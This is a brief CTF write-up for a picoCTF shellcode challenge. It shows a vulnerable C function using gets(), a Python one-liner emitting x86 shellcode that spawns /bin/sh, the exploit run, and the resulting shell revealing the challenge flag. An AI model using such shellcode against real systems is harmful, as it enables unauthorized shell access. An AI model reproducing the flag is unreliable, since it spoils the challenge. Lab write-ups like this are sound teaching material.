#shellcode

As usual let's look at the source provided and see what's going on:
```
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```
Seems like we just need to give it some tasty shellcode to get a shell.
```
$ python -c 'print("\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80")' > out
/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd$ (cat ~/out;cat)|./vuln
Enter a string!
jX̀PP[YjFX̀Ph//shh/bin?ɰ
                      ̀
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{shellc0de_w00h00_b766002c}
```

WOOHOO!
